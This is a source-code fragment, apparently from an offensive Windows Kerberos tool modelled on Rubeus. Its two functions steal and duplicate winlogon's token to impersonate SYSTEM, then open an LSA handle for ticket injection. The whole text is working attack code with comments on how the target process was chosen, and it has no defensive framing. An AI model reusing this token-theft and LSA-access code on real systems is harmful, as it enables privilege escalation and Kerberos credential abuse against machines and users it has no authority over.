// Therefore, to get a such a handle we perform token impersonation and
// duplicate the token of a system process. GetLsaHandle and GetSystem closely
// follow the source code from Rubeus in Rubeus/lib/LSA.cs and
// Rubeus/lib/Helpers.cs. Note also that this functionality is not implemented
// in that way in mimikatz, since mimikatz always injects tickets into the
// current session, which does not require that special privilege.
HANDLE GetLsaHandle()
{
    GetSystem();

    HANDLE hLsa = 0;
    NTSTATUS status = LsaConnectUntrusted(&hLsa);
    if (!NT_SUCCESS(status))
        LogError("LsaConnectUntrusted failed with error code : %ld\n", LsaNtStatusToWinError(status));

    RevertToSelf();

    return hLsa;
}

void GetSystem()
{
    // Some system process (with SeTcbPrivilege) that is not PPL.
    // Rubeus uses winlogon, which should be always present. After checking
    // Sysinternals ProcExp there seem to be some other candidates like Memory
    // Compression or svchost, but winlogon seems the better choice.
    // (For the specific examples listed: Memory Compression is as far I know
    // only present on newer systems; and for svchost: there exist many
    // instances, some SYSTEM, some not, some PPL => while some of those are
    // suitable, this would require more filtering; using winlogon is easier,
    // there is only one process with that name).
    DWORD pid = 0;
    GetProcessPidForName(L"winlogon.exe", &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
        LogError("OpenProcess failed with error code %ld\n", GetLastError());

    HANDLE hToken = 0;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken))
        LogError("OpenProcessToken failed with error code %ld\n", GetLastError());

    HANDLE hTokenDup = 0;
    if (!DuplicateToken(hToken, SecurityImpersonation, &hTokenDup))
        LogError("DuplicateToken failed with error code %ld\n", GetLastError());

    if (!ImpersonateLoggedOnUser(hTokenDup))
        LogError("ImpersonateLoggedOnUser failed with error code %ld\n", GetLastError());

    CloseHandle(hTokenDup);
    CloseHandle(hToken);
}
